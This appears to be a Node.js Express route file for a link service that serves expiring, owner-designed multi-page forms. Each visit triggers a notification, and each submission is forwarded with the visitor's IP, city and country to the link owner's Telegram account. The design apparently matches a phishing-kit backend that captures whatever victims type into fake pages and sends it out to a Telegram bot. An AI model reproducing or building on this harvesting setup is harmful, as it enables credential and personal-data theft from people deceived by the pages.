const Link = require('../../../models/Link');
const User = require('../../../models/User');
const { scratchVisitorNotification, scratchSubmissionNotification } = require('../../../templates/telegramNotifications');
const router = require('express').Router();
const sendMessage = require("../../../lib/telegramBot");

// GET - Success page (must be before /:linkId/:pageNumber to avoid "success" being parsed as pageNumber)
router.get("/:linkId/success", async (req, res) => {
    try {
        const { linkId } = req.params;

        const link = await Link.findOne({ linkId, expiresAt: { $gt: Date.now() } });
        
        if (!link || link.linkType !== 'scratch') {
            return res.redirect(303, "/not-found");
        }

        return res.render('scratch/success', {
            req,
            link,
            successPage: link.successPage || {
                title: 'Success!',
                message: 'Your submission has been received.',
                buttonText: 'Done',
                buttonUrl: '',
            },
        });
    } catch (error) {
        console.log(error);
        return res.redirect(303, "/not-found");
    }
});

// GET - Display custom page
router.get("/:linkId/:pageNumber?", async (req, res) => {
    try {
        const { linkId, pageNumber } = req.params;
        const currentPage = parseInt(pageNumber) || 1;

        console.log(`[Scratch] Looking for link: ${linkId}, page: ${currentPage}`);

        const link = await Link.findOne({ linkId, expiresAt: { $gt: Date.now() } });
        
        if (!link) {
            console.log(`[Scratch] Link not found: ${linkId}`);
            return res.redirect(303, "/not-found");
        }
        
        if (link.linkType !== 'scratch') {
            console.log(`[Scratch] Link type mismatch: ${link.linkType} !== scratch`);
            return res.redirect(303, "/not-found");
        }

        if (!link.customPages || link.customPages.length === 0) {
            console.log(`[Scratch] No customPages found for link: ${linkId}`);
            return res.redirect(303, "/not-found");
        }

        // Find the page configuration
        const pageConfig = link.customPages.find(p => p.pageNumber === currentPage);
        
        if (!pageConfig) {
            return res.redirect(303, "/not-found");
        }

        // Send visitor notification only on first page
        if (currentPage === 1) {
            const user = await User.findById(link.userId);
            if (user && user.telegramId) {
                const message = await scratchVisitorNotification(link.linkName);
                await sendMessage(user.telegramId, message);
            }
        }

        const totalPages = link.customPages.length;
        const isLastPage = currentPage >= totalPages;

        return res.render('scratch/page', {
            req,
            link,
            pageConfig,
            currentPage,
            totalPages,
            isLastPage,
        });
    } catch (error) {
        console.log(error);
        return res.redirect(303, "/not-found");
    }
});

// POST - Handle form submission
router.post("/:linkId/:pageNumber", async (req, res) => {
    try {
        const { linkId, pageNumber } = req.params;
        const currentPage = parseInt(pageNumber) || 1;

        const link = await Link.findOne({ linkId, expiresAt: { $gt: Date.now() } });
        
        if (!link || link.linkType !== 'scratch') {
            return res.redirect(303, "/not-found");
        }

        const pageConfig = link.customPages.find(p => p.pageNumber === currentPage);
        
        if (!pageConfig) {
            return res.redirect(303, "/not-found");
        }

        const user = await User.findById(link.userId);

        // Collect submitted data
        const submittedData = {};
        const { ip, city, country, region, ...formFields } = req.body;

        // Map form fields to their labels
        pageConfig.inputs.forEach((input, index) => {
            const fieldName = `input_${index}`;
            if (formFields[fieldName] !== undefined) {
                submittedData[input.label] = formFields[fieldName];
            }
        });

        // Send Telegram notification with submitted data
        if (user && user.telegramId) {
            const message = await scratchSubmissionNotification(
                link.linkName,
                currentPage,
                submittedData,
                ip || 'Unknown',
                city || 'Unknown',
                country || 'Unknown'
            );
            await sendMessage(user.telegramId, message);
        }

        const totalPages = link.customPages.length;
        const nextPage = currentPage + 1;

        // If there are more pages, redirect to next page
        if (nextPage <= totalPages) {
            return res.redirect(303, `/slink/scratch/${linkId}/${nextPage}`);
        }

        // All pages completed, redirect to success
        return res.redirect(303, `/slink/scratch/${linkId}/success`);
    } catch (error) {
        console.log(error);
        return res.redirect(303, "/not-found");
    }
});

module.exports = router;
